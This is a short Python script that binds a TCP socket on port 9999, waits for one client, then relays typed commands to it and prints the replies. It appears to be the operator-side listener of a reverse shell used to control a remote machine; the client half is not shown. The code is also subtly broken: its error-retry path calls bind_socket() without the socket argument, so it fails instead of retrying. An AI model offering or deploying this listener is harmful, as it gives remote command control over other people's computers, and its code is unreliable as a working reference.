import socket
import sys

# Creating socket /Connect to computer/


def create_socket():
    try:
        soc = socket.socket()
        return soc
    except socket.error as msg:
        print("Scoket Creation Error: "+str(msg))
        return False

# Binding the socket and listening for connection


def bind_socket(soc):
    try:
        port =9999
        host =""
        print("Binding the Port "+str(port))
        soc.bind((host, port))
        # Listening
        soc.listen(5)
    except socket.error as msg:
        print("Scoket Binding Error: "+str(msg)+"\n"+"Retrying...")
        bind_socket()

# Send command


def send_command(connection,soc):
    while True:
        command = input()
        if command == 'quit':
            connection.close()
            soc.close()
            sys.exit()

        if len(str.encode(command)) > 0:
            connection.send(str.encode(command))
            client_response = str(connection.recv(1024), "utf-8")
            print(client_response, end="")


# Establish connection with a client (socket must be listening )
def socket_accpt(soc):
    connection, add = soc.accept()
    print("Connection Successfull..")
    print("Connected to "+add[0]+"| Port "+str(add[1]))

    send_command(connection,soc)
    connection.close()


def main():
    soc = create_socket()
    if(soc):    
        bind_socket(soc)
        socket_accpt(soc)


main()
